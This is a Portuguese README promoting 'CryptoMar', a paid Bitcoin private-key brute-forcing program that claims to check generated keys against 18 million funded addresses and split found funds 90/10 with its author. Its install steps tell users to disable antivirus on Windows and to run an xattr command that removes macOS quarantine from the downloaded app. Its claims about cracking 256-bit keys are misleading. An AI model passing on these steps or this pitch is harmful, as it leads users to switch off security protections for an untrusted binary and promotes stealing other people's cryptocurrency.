# CryptoMar

CryptoMar é uma ferramenta de força bruta de alta performance para carteiras Bitcoin, baseada em uma biblioteca C++ personalizada e otimizada para macOS e Windows. O programa permite a geração e verificação de chaves privadas e endereços Bitcoin Bech32 (P2WPKH) em alta velocidade, com uma interface amigável voltada para usuários comuns.

## 🚀 Recursos

* Geração ultrarrápida de endereços Bitcoin usando uma biblioteca C++ nativa.
* Suporte para endereços Bitcoin no formato Bech32 (P2WPKH).
* Geração e verificação multithread com uso mínimo de memória.
* Banco de dados atualizado com todos os endereços P2WPKH existentes com saldo (atualizado em maio de 2025).

## 🔓 Como funciona

### 🗝️ Geração de chaves privadas e públicas

* O programa gera aleatoriamente um número de 256 bits que se torna a chave privada.
* A chave pública é gerada a partir da chave privada usando criptografia de curva elíptica (secp256k1).
* A chave pública é hashada duas vezes (SHA-256 e RIPEMD-160) para criar um endereço Bech32 (P2WPKH).

### 🚀 Como funciona a força bruta de carteiras

* O programa gera milhões de chaves privadas e os endereços Bech32 correspondentes.
* Cada endereço é verificado em um banco de dados com endereços conhecidos que possuem saldo confirmado.
* Se um endereço com saldo for encontrado, a chave privada é salva e o usuário é notificado.

## 🌐 Quantas carteiras possuem saldo?

Em 20 de maio de 2025, o banco de dados do programa contém **18.226.528** endereços Bech32 (P2WPKH) com saldos confirmados superiores a 0.00001 BTC.

## ❓ Por que o autor compartilha este programa?

Forçar chaves privadas exige tempo e poder computacional. O autor criou este software para distribuir o processo entre muitas pessoas. O usuário que encontrar a chave correta recebe 90% dos fundos e o autor fica com 10%.

## 📥 Download e instalação

### 🪟 Para Windows

1. Desative o antivírus.
2. Acesse a última versão: [CryptoMar Releases](https://github.com/HexaMar/HexaMar/releases/tag/v1.1.0)
3. Baixe o arquivo `CryptoMarInstaller.exe`
4. Siga as instruções do instalador.

### 🍎 Para macOS

1. Acesse a última versão: [CryptoMar Releases](https://github.com/HexaMar/HexaMar/releases/tag/v1.1.0)
2. Baixe o arquivo `CryptoMarAPP.zip`
3. Abra o arquivo `CryptoMarAPP.zip` na pasta Downloads.
4. Abra o terminal, digite o seguinte comando e pressione Enter:
   ```bash
   xattr -rd com.apple.quarantine ~/Downloads/CryptoMar.app
   ```
5. Inicie o programa `CryptoMar.app`

## ⚡ Versões gratuita e paga

* **Versão gratuita:** Velocidade e tempo de execução limitados (até 100 horas).
* **Versão paga:** Velocidade e execução ilimitadas.

Se o programa for fechado sem encontrar o arquivo, verifique se todos os arquivos necessários estão na mesma pasta.

## 💡 Suporte

Para suporte, entre em contato com o desenvolvedor ou crie uma *issue* no GitHub.  
Antes de usar o programa, leia os [Termos de uso](https://github.com/HexaMar/CryptoMar_EN/blob/main/README.txt)
